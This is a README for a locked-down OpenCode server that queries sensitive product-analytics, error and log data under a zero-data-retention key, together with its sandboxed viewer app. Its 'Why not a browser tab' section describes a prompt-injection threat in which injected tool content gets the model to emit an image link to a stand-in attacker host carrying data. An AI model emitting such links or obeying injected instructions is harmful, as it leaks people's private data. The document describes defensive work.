# Kickoff ZDR harness

A dedicated, locked-down [OpenCode](https://opencode.ai) server for questions
that need sensitive Kickoff data. It runs only on Kickoff's **zero-data-retention
(ZDR) OpenAI key** and only exposes the **Amplitude**, **BugSnag** and
**PostHog** MCP servers. Claude Code and Codex never see the raw data: they call the `zdr_ask`
MCP tool, and only the harness's final answer comes back.

```
Claude Code / Codex ──zdr_ask──▶ zdr-ask MCP (src/mcps/zdr-ask) ──HTTP──▶ opencode serve :4096
                                                                         ├─▶ api.openai.com (ZDR project)
                                                                         ├─▶ mcp.amplitude.com (OAuth)
                                                                         ├─▶ bugsnag.mcp.smartbear.com (token)
                                                                         └─▶ mcp.posthog.com (token, read-only)
```

ZDR status of the OpenAI project was proven on 2026-09-16: a Responses call with
`store: true` came back `store: false` and retrieval returned 404, while a
control key from another org stored normally.

## Layout

| Path | What |
|---|---|
| `src/zdr-harness/opencode/opencode.json` | OpenCode config (no secrets) |
| `src/zdr-harness/opencode/prompts/zdr.md` | The `zdr` agent prompt, including the **answer rule** |
| `src/zdr-harness/bin/zdr-harness` | Wrapper: preflight checks + isolated environment |
| `src/launchd/com.taylor.zdr-harness.plist` | Keeps `zdr-harness serve` running |
| `src/mcps/zdr-ask-mcp` + `src/mcps/zdr-ask/index.mjs` | Zero-dependency MCP bridge for Claude Code / Codex |
| `src/zdr-harness/app/` + `build_app.py` | **ZDR Harness.app**: native viewer for the web UI (see [App](#app)) |
| `data/zdr-harness/ZDR Harness.app` (not in git) | Build output; the installed copy is `~/Applications/ZDR Harness.app` |
| `src/zdr-harness/.env` (600, gitignored) | Every harness secret: `KICKOFF_OPENAI_ZDR_API_KEY`, `ZDR_HARNESS_PASSWORD`, `KICKOFF_BUGSNAG_TOKEN`, `KICKOFF_POSTHOG_TOKEN`. `~/.zdr-harness/.env` is a fallback if this is absent |
| `src/zdr-harness/.env.template` | Same keys and comments with empty values; keep the two in sync |
| `src/zdr-harness/mcps/kickoff-logs/` + `kickoff-logs-mcp` | Harness-only MCP server for production Lambda logs (see [Lambda logs](#lambda-logs)) |
| `src/zdr-harness/iam/` | The policy of record for the `zdr-harness-logs` AWS user |
| `~/.zdr-harness/opt/` | Pinned OpenCode install (`opencode-ai@1.18.31`) |
| `~/.zdr-harness/xdg/data/opencode/` | Sessions DB, MCP OAuth tokens, logs (**holds raw tool output**) |

1Password (Kickoff account, Employee vault): `KICKOFF_OPENAI_API_KEY` (the ZDR
key) and `ZDR_HARNESS_PASSWORD` (web UI / API Basic auth, username `opencode`).

## How it is locked down

- **Key isolation.** OpenCode runs under `env -i` with a private `HOME`, private
  `XDG_*` dirs and only the variables listed in the wrapper. The personal
  `OPENAI_API_KEY` that `com.taylor.mcp-tokens` puts in the launchd session never
  reaches it. The wrapper refuses to start if the ZDR key equals that personal
  key, or if a stored `auth.json` (which outranks env) exists.
- **One provider, one agent.** `enabled_providers: ["openai"]` plus a
  `provider.use` deny-all/allow-openai policy. Built-in `build`, `plan`, `general`
  and `explore` agents are disabled; `zdr` is the default.
- **No built-in tools, named MCP tools only.** `permission` denies `*`, then
  allows 33 named tools: 11 Amplitude, 16 BugSnag (all annotated read-only by
  their servers), PostHog's single `exec`, four CloudWatch Logs readers, and
  `todowrite`, which only keeps a plan in the session and touches nothing
  outside it. Shell, file, edit, web, task and
  skill tools, every BugSnag write tool (`update_error`,
  `set_network_endpoint_groupings`), Amplitude user lookup
  (`get_amp_user_data`), session replay, AI feedback and agent-analytics tools
  are hidden from the model entirely. OpenCode names MCP tools
  `<server>_<tool>`, so BugSnag's are `bugsnag_bugsnag_*`.
- **PostHog is the exception to the allowlist.** Its MCP exposes one router
  tool, `exec`, which reaches ~347 API tools, so a per-tool allowlist cannot
  constrain it. Three server-side controls do instead: the personal API key is
  read-scoped (a `POST /dashboards/` probe returns "API key missing required
  scope 'dashboard:write'"), the URL carries `readonly=true`, and it is pinned
  to `project_id=433067` (Kickoff Production). Anything that key can read,
  including person-level rows, is reachable inside the harness; the agent's
  answer rule and `zdr_ask`'s scrubbing are what keep it from coming back out.
- **No vendor egress.** Sharing, auto-update, Claude Code file loading, project
  config, default plugins, external skills, LSP downloads and the model-catalog
  fetch are all off. Config is passed as a single file (`OPENCODE_CONFIG`)
  because OpenCode runs a background `npm install` in every **writable** config
  directory; the one config dir still in play (`~/.zdr-harness/xdg/config/opencode`)
  is kept `chmod 555`, and the wrapper refuses to start if it becomes writable.
  Never set `OPENCODE_DISABLE_EMBEDDED_WEB_UI`: it makes the server proxy the UI,
  with credentials, to `app.opencode.ai`.
- **Local only.** Binds `127.0.0.1:4096` with HTTP Basic auth.
- **Pinned.** The wrapper refuses any OpenCode version other than 1.18.31, and
  refuses if managed config exists at `/Library/Application Support/opencode`.
- **Answer rule.** The reply is the only thing that leaves the harness, and it
  lands somewhere with neither zero data retention nor a BAA, so the agent
  prompt holds it to HIPAA Safe Harbor (45 CFR 164.514(b)(2)): none of the 18
  identifier types, nothing that singles out one person, and no grouping under
  11 people (CMS's cell-size policy). Within that line it is deliberately
  generous: aggregates, catalogue and schema names, object IDs and console
  links (a BugSnag error ID names a record, not a person), device *model* names,
  verbatim exception messages with identifiers placeholdered, and stack frames
  down to file and line. Person-scoped codes stay out even when random
  (`distinct_id`, device, session and replay IDs), because the agent asking can
  open the same tools and translate them back. When something is withheld the
  agent says which field and points at the session in the app, where the raw
  result already is. `zdr_ask` additionally scrubs email addresses and phone
  numbers from what it returns.

**Auth per server (revised 2026-09-17).** Amplitude uses OAuth. OpenCode's MCP
SDK (1.29, following SEP-835) requests every scope a server advertises and
ignores a configured `oauth.scope`, and Amplitude advertises
`mcp:read mcp:write`, so that token can write; read-only is enforced by exposing
only named read-only tools, plus the account's Amplitude role.

BugSnag and PostHog use long-lived tokens from `src/zdr-harness/.env` instead,
set as `headers` with `oauth: false`, so there is nothing to re-authorise in a
browser:

- **BugSnag** needs `Authorization: token <KICKOFF_BUGSNAG_TOKEN>`. Its API
  rejects `Bearer` with `401 Bad Credentials`, which is what the OAuth path hit
  once its hour-long access token expired; OpenCode does not refresh a token the
  MCP server reports as bad inside a tool result, so the harness looked
  `connected` while every BugSnag call failed. The token itself is full-access,
  so the two write tools stay out of the allowlist.
- **PostHog** needs `Authorization: Bearer <KICKOFF_POSTHOG_TOKEN>` and a
  read-scoped key (see above).

The tokens are never copied into config or logs: `opencode.json` references
`{env:KICKOFF_BUGSNAG_TOKEN}` and `{env:KICKOFF_POSTHOG_TOKEN}`, and the wrapper
names each variable explicitly when building the isolated environment.

They live in `src/zdr-harness/.env`, next to the config they belong to and
gitignored, with `.env.template` as the tracked shape. The file header says the
tokens are for this harness only. That is a note, not an enforcement mechanism:
the file sits inside the dotfiles repo, so any agent working in this checkout
can read it, and `chmod 600` only stops other users.

Known gap: the permission rules constrain the model, not the HTTP API. Anyone
with the Basic password can still reach OpenCode's shell/PTY endpoints. The
localhost bind and a random 64-hex-char password are the control.

## Everyday use

From Claude Code or Codex, call `zdr_ask` with a question; pass the returned
`session_id` for follow-ups. `zdr_sessions` lists recent sessions.

```sh
zdr-harness status     # health, MCP connection state, web UI URL
zdr-harness attach     # TUI on the running server
zdr-harness logs
zdr-harness restart
zdr-harness reload-auth          # apply edited secrets: restart + probe tokens
zdr-harness set-token KICKOFF_POSTHOG_TOKEN   # hidden prompt, restart, re-check
zdr-harness app                  # build if stale, install, open ZDR Harness.app
zdr-harness prune --dry-run      # sessions not updated in 30 days
zdr-harness prune --days 14      # delete sessions not updated in 14 days
```

Read and drive chats in **ZDR Harness.app**, not a browser tab (see [App](#app)).
(`zdr-harness` = `~/dotfiles/src/zdr-harness/bin/zdr-harness`.)

## App

`~/Applications/ZDR Harness.app` (bundle id `com.taylor.zdr-harness.app`) is a
small Swift app (AppKit + WebKit, no dependencies, ad-hoc signed) that shows the
server's own embedded web UI in a `WKWebView`. It exists because a browser tab
is not safe for this data.

**Why not a browser tab.** The UI's CSP is `img-src 'self' data: https: blob:;
connect-src *`. A model answer containing `![](https://attacker/?q=<data>)`
makes a browser fetch that URL, and Amplitude or BugSnag content can carry
injected text asking for exactly that. The agent's answer rule refuses to emit
image links (tested 2026-09-17), but a prompt is not a control.
**Why not OpenCode Desktop.** It ships Sentry and starts its own server.

What the app does:

- **Blocks every request that is not `http://127.0.0.1:4096/`.** A
  `WKContentRuleList` (block `.*`, then `ignore-previous-rules` for
  `^http://127\.0\.0\.1:4096/`) is installed before the first load. It covers
  images (including `https:`), `fetch`, CSS, fonts, beacons and WebSockets. If
  it fails to compile, the app shows an error and never loads the UI.
- **Terminal panel disabled.** OpenCode's PTY panel uses `ws://`, which the rule
  list blocks. A terminal there would be a shell holding the ZDR key.
- **Second layer**, for what a rule list cannot see: a document-start script
  turns DNS prefetch off and removes `RTCPeerConnection`.
- **Navigation lock.** Only the harness origin loads in the window. Any other
  link or popup is cancelled and shows its full URL with "Open in browser" /
  "Cancel". Downloads, file uploads, camera and microphone are denied.
- **Signs in without a prompt.** Reads only `ZDR_HARNESS_PASSWORD` from
  `~/.zdr-harness/.env` at launch and keeps it in memory. It answers Basic
  challenges only from `127.0.0.1:4096`, once; every other challenge is
  cancelled.
- **Status and service controls.** Title-bar status (`Healthy · amplitude ✓ ·
  bugsnag ✓`) from `/global/health` and `/mcp` every 30 s and on focus. The
  Harness menu has Restart Service (`launchctl kickstart -k`, or `bootstrap` if
  booted out), Open Logs Folder, Open README and Copy Web URL. If the service is
  down the window shows Restart Service / Retry and reloads once healthy. An MCP
  server in `needs_auth`/`failed` gets an alert with the re-auth command.
- **No leftovers.** HTTP caches are cleared at launch and quit. localStorage
  keeps UI prefs, drafts and the project list under
  `~/Library/WebKit/com.taylor.zdr-harness.app`. The web inspector is off unless
  launched with `--debug`.

Log: `~/.zdr-harness/logs/app.log` (rotated at 1 MB): launches, rule-list
compile, blocked navigations (host and path only), health changes.

**Not covered.** The status dot reflects `/mcp`, which says `connected` even
when a server's upstream token has expired (BugSnag answers `401 Bad
Credentials` inside tool results); re-auth fixes it. The rule list governs this
app only: anyone with the password can still use a browser or the API. Clipboard
contents and anything opened with "Open in browser" leave the app's control.

**First run.** OpenCode 1.18.31 always uses its new layout. Home (`/`) lists
sessions only for projects the UI knows, so once: **Add project → type
`/Users/taylor/.zdr-harness/work` → pick it**. The UI remembers it. Session links
look like `/<base64url of the dir>/session/<id>`; open one directly with
`open -a "ZDR Harness" --args --session <id>`.

```sh
zdr-harness app                  # build if stale, install to ~/Applications, open
zdr-harness app-build --force    # rebuild and install without opening
A="$HOME/Applications/ZDR Harness.app/Contents/MacOS/ZDRHarness"
"$A" --self-test                 # prints one JSON object, exit 0 only if all pass
"$A" --self-test --canary-port 19471 --snapshot-dir /tmp/zdr-shots
"$A" --self-test-recovery        # with the service booted out: placeholder, restart, reload
"$A" --expect-env-error --env-file /nonexistent
```

`--self-test` runs the real window code off-screen and checks: rule list
compiled; home rendered with sessions listed; in-page `fetch('/session')` 200
(the Basic credential carries over); `EventSource('/event')` gets
`server.connected`; `fetch`, `http:` and `https:` images and a WebSocket to a
loopback canary on another port are blocked; foreign auth challenges are
cancelled; the second layer is active. A throwaway web view with no rules must
reach its own canary (positive control), so "zero requests" means something.
With `--canary-port N` blocking is tested against your listener, whose access
log must stay empty; with `--session <id>` it also puts Markdown-style images
into the rendered answer.

## Lambda logs

`src/zdr-harness/mcps/kickoff-logs` gives the harness read-only access to
Kickoff's production Lambda logs in CloudWatch: `list_groups`, `list_streams`,
`search` (FilterLogEvents) and `query` (Logs Insights). Zero dependencies, node
stdlib only, SigV4 signed in about 40 lines, launched over stdio inside the same
isolated environment as everything else.

**Harness-only.** These logs carry request payloads, headers and client free
text, so this server must never be registered in Claude Code, Codex or any other
non-ZDR client. The harness is the point: raw lines stay here and the answer rule
governs what leaves.

Three walls, not one:

- **The code.** Only four read APIs are implemented, so no prompt can reach a
  mutating call regardless of what the credential allows.
- **The server's own filter.** Group names must match
  `/aws/lambda/(kickoff|kudos)-*-production-*`; a staging or beta group is
  refused before AWS sees it.
- **IAM.** The `zdr-harness-logs` user is read-only on those same groups
  (`iam/zdr-harness-logs-policy.json`), and is not the account's admin user.

Windows and result counts are capped because Insights bills per GB scanned and
`/aws/lambda/kudos-node-production-graphql` alone holds ~500 GB: 24 h maximum
window (1 h default), 200 events per search, 1000 rows per query, 5 groups per
query, 90 s query timeout with `StopQuery` on overrun. Every query reports the
bytes it scanned.

Credentials are optional. Without them the harness starts normally and the tools
answer with the exact command to fix it. Setup is in
[`iam/README.md`](iam/README.md).

## Setup from scratch

```sh
ZH=~/.zdr-harness
mkdir -p $ZH/{home,work,tmp,logs,opt,xdg/config,xdg/data,xdg/cache,xdg/state} && chmod 700 $ZH $ZH/*
npm i --prefix $ZH/opt --no-fund --no-audit opencode-ai@1.18.31

# Secrets (never echoed)
umask 077
# Copy src/zdr-harness/.env.template to $ZH/.env, then fill in the four values
# (keep the template's keys and comments; only the values differ).
cp ~/dotfiles/src/zdr-harness/.env.template $ZH/.env
op read -n 'op://Employee/KICKOFF_OPENAI_API_KEY/credential' --account kudos-fit.1password.com   # KICKOFF_OPENAI_ZDR_API_KEY
op read -n 'op://Employee/ZDR_HARNESS_PASSWORD/password' --account kudos-fit.1password.com       # ZDR_HARNESS_PASSWORD
# KICKOFF_BUGSNAG_TOKEN: BugSnag personal auth token. KICKOFF_POSTHOG_TOKEN: read-scoped PostHog personal API key.
chmod 600 $ZH/.env

# Read-only global config dir (blocks OpenCode's background npm install)
mkdir -p $ZH/xdg/config/opencode
printf 'node_modules\npackage.json\npackage-lock.json\nbun.lock\n.gitignore' > $ZH/xdg/config/opencode/.gitignore
chmod 444 $ZH/xdg/config/opencode/.gitignore && chmod 555 $ZH/xdg/config/opencode

# BugSnag and PostHog read their tokens from ~/dotfiles/.env (KICKOFF_BUGSNAG_TOKEN,
# KICKOFF_POSTHOG_TOKEN). Only Amplitude needs the one-time browser OAuth.
~/dotfiles/src/zdr-harness/bin/zdr-harness mcp auth amplitude

# Service
ln -sf ~/dotfiles/src/launchd/com.taylor.zdr-harness.plist ~/Library/LaunchAgents/
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.taylor.zdr-harness.plist

# Clients
claude mcp add zdr-ask -s user -- /Users/taylor/dotfiles/src/mcps/zdr-ask-mcp
codex mcp add zdr-ask -- /Users/taylor/dotfiles/src/mcps/zdr-ask-mcp
```

Answers can take minutes. In `~/.codex/config.toml` set `tool_timeout_sec = 600`
under `[mcp_servers.zdr-ask]`; for Claude Code set `MCP_TOOL_TIMEOUT=600000`.

## Changing the tool allowlist

OpenCode has no API that lists MCP tools, and a server can add tools at any
time. An allowlist entry only works if its exact name exists, so check names
against the server first. Ask the harness itself (via `zdr_ask`: "list the exact
names of every tool you can call; do not call any tools"), or call the server's
`tools/list` with the token in `~/.zdr-harness/xdg/data/opencode/mcp-auth.json`
and read each tool's `readOnlyHint`. Add only tools marked read-only, then
`zdr-harness restart`.

## Re-auth

Only Amplitude uses OAuth. If `zdr-harness status` shows `needs_auth` or
`failed` for it:

```sh
zdr-harness mcp auth amplitude && zdr-harness restart
```

For BugSnag or PostHog, `connected` is not proof: a bad token surfaces as a
`401` inside a tool result, so check with one real question per server.

### Reflowing auth after an edit

`{env:...}` is resolved once, when the server starts, so editing the secrets
file changes nothing until that process restarts. Reloading the app's web UI
does not do it. Either of these does:

```sh
zdr-harness reload-auth      # restart, fingerprints, and probe each token's API
```

In the app, **⇧⌘R** (View or Harness → Reload Auth) restarts the service and
reloads once healthy. Plain **⌘R** does it too whenever the secrets file is
newer than the running server, so a page reload cannot silently keep an old
token; the title bar shows `secrets changed (⇧⌘R)` while that is true.

`zdr-harness status` and `reload-auth` print the live secrets path and a
length plus SHA-256 prefix per key. Those fingerprints are how you tell an edit
landed in the file the server actually reads — comparing them against the
running process is the check that catches a token edited in the wrong file:

```sh
ps -Eww -p "$(pgrep -f 'opencode.exe serve')" | tr ' ' '\n' |
  grep '^KICKOFF_POSTHOG_TOKEN=' | cut -d= -f2- | shasum -a 256 | cut -c1-12
```

`zdr-harness set-token <KEY>` is the alternative to an editor: hidden prompt,
one line rewritten in place, restart and re-check, fingerprint printed.

## Upgrading OpenCode

Deliberately only. Read the release notes (watch for the V2 core and the
Responses WebSocket / `previous_response_id` path), then:

1. `npm i --prefix ~/.zdr-harness/opt opencode-ai@<version>` and bump
   `OPENCODE_VERSION` in the wrapper.
2. Re-check the source for new config dirs, npm installs, telemetry or proxies.
3. Re-run every step in **Verification**.

## Verification

Run all of these after setup and after any upgrade or change to the wrapper,
config or app.

1. **Key isolation.** `ps -Eww -p "$(pgrep -f 'opencode.exe serve')" | tr ' ' '\n' | grep -c _API_KEY=` → `1`,
   and its SHA-256 prefix matches the ZDR key in 1Password, not `launchctl getenv OPENAI_API_KEY`.
2. **Effective state** (authenticated `curl` with `x-opencode-directory: ~/.zdr-harness/work`):
   `GET /config/providers` → only `openai`; `GET /agent` → `zdr` plus hidden
   `compaction`/`summary`/`title`; `GET /mcp` → all three `connected`; no auth →
   `401`. Then ask one aggregate question per server: `connected` does not prove
   the credential works.
3. **Tool denial.** Ask it to read `/etc/hosts` and run `ls` → no tool parts in
   the reply, and it says it has no such tools.
4. **Egress.** Sample `lsof -nP -iTCP -a -p <pid>` across a restart and a prompt
   that uses both MCP servers. Allowed: `api.openai.com`, `mcp.amplitude.com`,
   `bugsnag.mcp.smartbear.com`, `oauth.bugsnag.com`. Anything else (npm
   `104.16.x.34`, `*.opencode.ai`, GitHub, PostHog, Sentry) is a failure.
5. **ZDR probe.** A Responses call with `store: true` using the harness key must
   return `store: false`, and fetching the response ID must return 404.
6. **End to end.** `zdr_ask` an aggregate question from Claude Code, ask a
   follow-up with the same `session_id`, and open the session in the app.
7. **App build.** `zdr-harness app-build --force`, then
   `codesign --verify --deep --strict ~/Applications/ZDR\ Harness.app`, and grep
   the bundle (including `strings` of the binary) for the first 16 characters of
   the password and 24 of the key → 0 hits.
8. **App self-test.** Start a loopback listener that logs every connection on a
   spare port, run `--self-test --canary-port <port>` and
   `--self-test --canary-port <port> --session <id>` → `allPass` and an empty
   listener log.
9. **App egress.** With the app open on a session while a prompt streams, sample
   `lsof -nP -iTCP -a -p` for `ZDRHarness` and its `com.apple.WebKit.*`
   processes (the ones holding `com.taylor.zdr-harness.app` files) → only
   `127.0.0.1:4096` (plus the self-test's own loopback canary if one is running).
10. **Lambda logs.** `list_groups` returns only production groups, and a
    staging group name is refused by the server rather than by AWS.
11. **App failure states.** `launchctl bootout gui/$(id -u)/com.taylor.zdr-harness`,
    run `--self-test-recovery` → `allPass`, then `zdr-harness status` healthy.

## Data retention

`~/.zdr-harness/xdg/data/opencode/opencode.db` and `log/` keep full sessions,
including raw Amplitude and BugSnag tool output, on this Mac. Delete old
sessions with `zdr-harness prune [--days N]` (dry-run first with `--dry-run`),
`DELETE /session/<id>`, or remove the DB while the service is stopped. There is
no scheduled prune.
